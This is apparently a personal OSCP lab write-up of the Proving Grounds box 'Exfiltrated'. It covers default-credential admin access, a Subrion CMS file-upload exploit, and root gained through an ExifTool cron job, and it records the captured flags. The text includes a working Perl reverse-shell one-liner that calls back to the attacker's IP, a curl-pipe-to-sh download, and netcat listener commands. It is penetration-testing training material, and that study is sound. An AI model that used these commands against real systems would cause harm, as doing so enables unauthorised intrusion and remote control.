---
Date: 2024-10-02
Course: "[[OSCP]]"
Platform: PG-Practice
Category: Linux
Difficulty: Easy
Status: Complete
IP: 192.168.155.163
Writeup:
---
# Exfiltration
Relatively easy box turned into a VERY frustrating experience at not being able to properly execute `exiftool` exploit because of missing library dependencies. Exploit actually detailed exactly *how* to install those dependencies, but I was looking for instructions on Stack Overflow instead of in the script itself - ***always read the script!*** 

Exploits were relatively straight forward once the dependencies were sorted though, so all round good practice on the process of popping boxes. Local user had also been identified by `linpeas.sh` but ended up getting root first (flag = `proof.txt`) then using root privilege to find the `coaran` user with GID=1000 and the local flag (flag = `local.txt`). 
# Resolution summary
- Ran nmap to find SSH & HTTP (Targeted HTTP for initial enumeration) 
- Navigated to web site, password guessed `admin:admin` for admin access
- Established server is running Subrion CMS 4.2.1 (vulnerable to CVE-2018-19422)
- Established initial access with exploit `49876.py`
- Downloaded `linpeas.sh` for server enumeration
- Identified cronjob `image-exif.sh` for `exiftool` (vulnerable to CVE-2021-22204)
- Created malicious image file with exploit `50911.py`, 
- Uploaded image to target server, and caught the reverse shell for `root` access
- Found and printed `proof.txt` & `local.txt`
## Improved skills
- General workflow
- Server enumeration
- Exploit identification
- Understanding of python modules
## Used tools
- nmap
- netcat (nc)
- linpeas.sh
- python3

---

# Information Gathering
Scanned all TCP ports:
```bash
sudo nmap -sC -sV -oN nmap 192.168.155.163 -v
```

Enumerated open TCP ports:
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/
|_http-favicon: Unknown favicon MD5: 09BDDB30D6AE11E854BFF82ED638542B
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---
# Enumeration

## Port 22 - SSH (OpenSSH 8.2p1)
No enumeration conducted

## Port 80 - HTTP (Apache httpd 2.4.41)
- Updated `/etc/hosts` with `192.168.155.163 http://exfiltrated.offsec`
- Visited http://exfiltrated.offsec in FireFox Browser
![[Cybersecurity-Resources/images/Pasted image 20241002175938.png]]
	- 
- Viewed http://exfiltrated.offsec page source (saved as http-page-source.txt)
		- "Powered by Subrion 4.2" - Subrion 4.2 CMS
			- ExploitDB - [Arbitary File Upload Exploit available](https://www.exploit-db.com/exploits/49876)
		- "//exfiltrated.offsec/modules/fancybox/js/jquery.fancybox.css"
			- Running fancybox (JQuery)
- Visited http://exfiltrated.offsec/robots.txt
![[Cybersecurity-Resources/images/Pasted image 20241002181025.png]]
- Visited http://exfiltrated.offsec/panel/
![[Cybersecurity-Resources/images/Pasted image 20241002181853.png]]
	- Attempted login: 
		- admin:admin = SUCCESSFUL
		![[Cybersecurity-Resources/images/Pasted image 20241002182025.png]]
		- Checked PHP Info (PHP Version 7.4.3)
		![[Cybersecurity-Resources/images/Pasted image 20241002182354.png]]
		- Configuration Info 
		![[Cybersecurity-Resources/images/Pasted image 20241002182616.png]]
		- Apache Environment
		![[Cybersecurity-Resources/images/Pasted image 20241002182705.png]]
		- exif support enabled
		![[Cybersecurity-Resources/images/Pasted image 20241002182908.png]]

---

# Exploitation
## CVE-2018-19422 - Subrion CMS 4.2.1 (Arbitrary File Upload)
Used exploit 49876.py with `admin:admin` credentials to achieve webshell, then established a reverse shell with Perl;
![[Cybersecurity-Resources/images/Pasted image 20241002200817.png]]
Perl reverse Shell
```
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.45.198:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
Caught with NetCat Listener on 4444
![[Cybersecurity-Resources/images/Pasted image 20241002200950.png]]

---
# Privilege Escalation
## Local Enumeration
Attempted access to `/root` folder (permission denied), then downloaded & ran linpeas.sh
`curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`
![[Cybersecurity-Resources/images/Pasted image 20241002201246.png]]
> - System info: Linux version 5.4.0-74-generic
> - OS: Ubuntu 20.04.2 LTS (focal)
> - Sudo v1.8.31
> - Exploit suggestions
> [+] [CVE-2021-4034] 	[CVE-2022-2586] nft_object UAF
>    Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
>    Exposure: probable
>    Tags: [ ubuntu=(20.04) ]{kernel:5.12.13}
>    Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
>    Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
> 
> [+] [CVE-2021-4034] PwnKit
>    Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
>    Exposure: probable
>    Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
>    Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
> 
> [+] [CVE-2021-3156] sudo Baron Samedit
>    Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
>    Exposure: probable
>    Tags: mint=19,[ ubuntu=18|20 ], debian=10
>    Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
> 
> [+] [CVE-2021-3156] sudo Baron Samedit 2
>    Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
>    Exposure: probable
>    Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
>    Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
> 
> [+] [CVE-2021-22555] Netfilter heap out-of-bounds write
>    Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
>    Exposure: probable
>    Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
>    Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
>    ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
>    Comments: ip_tables kernel module must be loaded
> 
> [+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
>    Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
> https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
>    Exposure: less probable
>    Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
>    Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
>    Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
> 
> [+] [CVE-2017-5618] setuid screen v4.5.0 LPE
>    Details: https://seclists.org/oss-sec/2017/q1/184
>    Exposure: less probable
>    Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154
> Users with Console
> 	coaran:x:1000:1000::/home/coaran:/bin/bash
> 
> Some home ssh config file was found
> 	/usr/share/openssh/sshd_config                                                                                   
> 	Include /etc/ssh/sshd_config.d/*.conf
> 	ChallengeResponseAuthentication no
> 	UsePAM yes
> 	X11Forwarding yes
> 	PrintMotd no
> 	AcceptEnv LANG LC_*
> 	Subsystem       sftp    /usr/lib/openssh/sftp-server
> 
> Cron Jobs
> ![[Cybersecurity-Resources/images/Pasted image 20241002202522.png]]
- Identified `bash /opt/image-exif.sh` (aka exiftool) running constantly
- Multiple exploits available for `exiftool`
## Privilege Escalation vector
### Exploit - ExifTool 12.23 - Arbitrary Code Execution
- EDB-ID: 50911 CVE-2021-22204
- First attempt running exploit failed (missing dependencies)
![[Cybersecurity-Resources/images/Pasted image 20241003194919.png]]
- Checked exploit script, found dependencies, 
- Installed: `sudo apt install djvulibre-bin` & `sudo apt install exiftool`
- Re-ran exploit 49876.py & created `image.jpg`
![[Cybersecurity-Resources/images/Pasted image 20241003195231.png]]
- Served `image.jpg` on http webserver: `python3 -m http.server 80`
- Launched netcat listener: `nc -nvlp 4567`
- Uploaded `image.jpg` to target machine from shell on port 4444: 
  `wget http://192.168.45.198/image.jpg`
![[Cybersecurity-Resources/images/Pasted image 20241003200145.png]]
- Waited for reverse shell to port 4567, and established user is `root`
![[Cybersecurity-Resources/images/Pasted image 20241003200430.png]]
- Navigated to root directory and printed `proof.txt`
![[Cybersecurity-Resources/images/Pasted image 20241003200649.png]]
- Checked `/etc/passwd` for other users, found `coaran:x:1000:1000::/home/coaran:/bin/bash`
![[Cybersecurity-Resources/images/Pasted image 20241003201209.png]]
- Navigated to `coaran` home & found `local.txt`
![[Cybersecurity-Resources/images/Pasted image 20241003201320.png]]
---
# Trophy & Loot
`local.txt` = `011940b8f5252122e347d49940222cc1`
`proof.txt` = `5734b93a1c31e16cb89787002dfbb4a6`
